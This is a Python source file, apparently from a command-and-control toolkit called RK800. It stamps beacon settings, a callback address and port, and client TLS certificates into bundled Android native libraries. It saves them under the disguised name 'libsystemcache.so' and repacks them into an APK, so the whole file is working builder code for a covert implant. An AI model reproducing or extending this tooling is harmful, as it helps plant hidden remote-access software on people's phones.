from rk800.tls_cert import RK800CertStore
from rk800.apk_repack import APKRepack
import argparse
import tempfile
from pathlib import Path
from typing import Optional
from importlib.resources import files
import struct


class Configure:
    """Configure APK with client settings and certificates

    Handles stamping binary with configuration data and repacking APK.
    """

    CLIENT_CANARY = b"\x41\x39\x31\x54\x21\xff\x3d\xc1\x7a\x45\x1b\x4e\x31\x5d\x36\xc1"
    CLIENT_FORMAT = "!HHQqQ256s2048s2048s2048s"
    SEC_IN_MIN = 60
    SANITY = 1987

    def __init__(self, output_path: Path, args: argparse.Namespace, ctx):
        """Initialize Configure instance

        Args:
            output_path (Path): path for output APK file
            args (argparse.Namespace): command line arguments
            ctx: RK800Context instance with view manager
        """
        self.output_path = output_path
        self.args = args
        self.ctx = ctx
        self.cert_manager = RK800CertStore(self.ctx)

    def _pack_client_config(self, args: argparse.Namespace) -> bytes:
        """Pack client configuration into binary format

        Args:
            args (argparse.Namespace): command line arguments

        Returns:
            bytes: packed client configuration data
        """
        beacon_interval_seconds = args.beacon_interval * self.SEC_IN_MIN
        beacon_jitter_seconds = args.beacon_jitter * self.SEC_IN_MIN

        client_certs = self.cert_manager.generate_client_cert()

        return struct.pack(
            self.CLIENT_FORMAT,
            self.SANITY,
            args.port,
            beacon_interval_seconds,
            beacon_jitter_seconds,
            args.connection_weight,
            args.address.encode("utf-8"),
            client_certs["client_key"].encode("utf-8"),
            client_certs["client_cert"].encode("utf-8"),
            client_certs["ca_cert"].encode("utf-8"),
        )

    def stamp_binary(self, binary_data: bytes, args: argparse.Namespace) -> bytes:
        """Stamp binary with configuration data

        Args:
            binary_data (bytes): original binary data
            args (argparse.Namespace): command line arguments

        Returns:
            bytes: binary data with configuration stamped
        """
        data = bytearray(binary_data)

        canary_index = data.find(self.CLIENT_CANARY)
        if canary_index == -1:
            raise ValueError(f"CLIENT_CANARY not found in binary data")

        packed_config = self._pack_client_config(args)
        config_size = len(packed_config)
        expected_size = struct.calcsize(self.CLIENT_FORMAT)

        if config_size != expected_size:
            raise ValueError(
                f"Config size mismatch: got {config_size}, expected {expected_size}"
            )

        if canary_index + config_size > len(data):
            raise ValueError(f"Not enough space in binary for config data")

        data[canary_index : canary_index + config_size] = packed_config

        return bytes(data)

    def write_configured_apk(self) -> None:
        """Write configured APK with stamped binaries"""
        with tempfile.TemporaryDirectory() as tmp_dir:
            tmp_path = Path(tmp_dir)
            self._process_binary_assets(tmp_path)
            self._repack_apk(tmp_path)

    def _process_binary_assets(self, output_dir: Path) -> None:
        """Process and stamp all binary assets to output directory"""
        resource_manager = files("rk800.assets")

        for resource in resource_manager.iterdir():
            if resource.name.endswith(".so"):
                self._process_single_binary(resource, output_dir)

    def _process_single_binary(self, resource, output_dir: Path) -> None:
        """Process a single binary resource and write to appropriate directory"""
        so_bytes = resource.read_bytes()
        arch_subdir = self._determine_arch_directory(resource.name)

        if arch_subdir:
            arch_dir = output_dir / arch_subdir
            arch_dir.mkdir(parents=True, exist_ok=True)
            output_file = arch_dir / "libsystemcache.so"

            stamped_data = self.stamp_binary(so_bytes, self.args)
            output_file.write_bytes(stamped_data)

    def _determine_arch_directory(self, filename: str) -> Optional[str]:
        """Determine the Android architecture directory for a binary filename"""
        if "x86_64" in filename:
            return "x86_64"
        elif "arm32" in filename:
            return "armeabi-v7a"
        elif "aarch64" in filename:
            return "arm64-v8a"
        return None

    def _repack_apk(self, binary_dir: Path) -> None:
        """Repack the APK with processed binaries"""
        apk_repack = APKRepack(binary_dir, self.output_path, self.ctx)
        apk_repack.repack()
